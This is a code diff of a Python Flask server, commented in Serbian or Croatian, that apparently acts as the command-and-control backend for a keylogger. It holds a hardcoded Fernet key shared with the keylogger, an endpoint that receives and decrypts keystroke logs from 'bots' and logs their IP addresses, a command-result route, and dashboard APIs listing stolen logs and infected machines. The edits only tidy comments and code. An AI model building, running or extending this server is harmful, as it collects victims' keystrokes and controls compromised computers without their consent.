@@ -34,7 +34,6 @@ logging.basicConfig(
 # =====================================================================
 # ENKRIPCIJA - DIREKTAN KLJUČ
 # =====================================================================
-# TVOJ GENERISANI KLJUČ - ISTI KAO U KEYLOGGER-U!
 MY_KEY = b'PLSiCRE32cI0ErE5vgqCtpGJzy5UO4h5D3UDwgbYJ-A='
 cipher = Fernet(MY_KEY)
 print(f"[+] Encryption key loaded: {MY_KEY[:20]}...")
@@ -212,7 +211,7 @@ def receive_keylog():
         if not bot_id or not log_data:
             return jsonify({"status": "error", "message": "Missing fields"}), 400
         
-        # Dekodiraj i dekriptuj - SA FALLBACK-OM
+        # Dekodiraj i dekriptuj
         decoded_log = None
         try:
             encrypted = base64.b64decode(log_data)
@@ -220,7 +219,6 @@ def receive_keylog():
             print(f"[+] Decrypted successfully: {len(decoded_log)} chars from {bot_id}")
         except Exception as e:
             print(f"[-] Decryption error: {e}")
-            # Fallback: pokušaj da dekodiraš bez enkripcije (za testiranje)
             try:
                 decoded_log = base64.b64decode(log_data).decode('utf-8', errors='ignore')
                 print(f"[+] Fallback: accepted unencrypted data from {bot_id}")
@@ -233,7 +231,6 @@ def receive_keylog():
         save_bot(bot_id, timestamp, request.remote_addr)
         update_bot_last_seen(bot_id, timestamp)
         
-        # Log za forenziku
         logging.info(f"Keylog received from {bot_id} ({len(decoded_log)} chars) from {request.remote_addr}")
         
         return jsonify({"status": "ok", "message": "Data received"}), 200
@@ -285,13 +282,12 @@ def command_result():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# API RUTE (za dashboard) - SA TRY/EXCEPT
+# API RUTE (za dashboard)
 # =====================================================================
 @app.route('/api/logs', methods=['GET'])
 def api_logs():
     try:
-        logs = get_recent_logs(100)
-        return jsonify({"logs": logs})
+        return jsonify({"logs": get_recent_logs(100)})
     except Exception as e:
         print(f"[-] Error in api_logs: {e}")
         return jsonify({"logs": [], "error": str(e)}), 500
@@ -299,8 +295,7 @@ def api_logs():
 @app.route('/api/bots', methods=['GET'])
 def api_bots():
     try:
-        bots = get_all_bots()
-        return jsonify({"bots": bots})
+        return jsonify({"bots": get_all_bots()})
     except Exception as e:
         print(f"[-] Error in api_bots: {e}")
         return jsonify({"bots": [], "error": str(e)}), 500
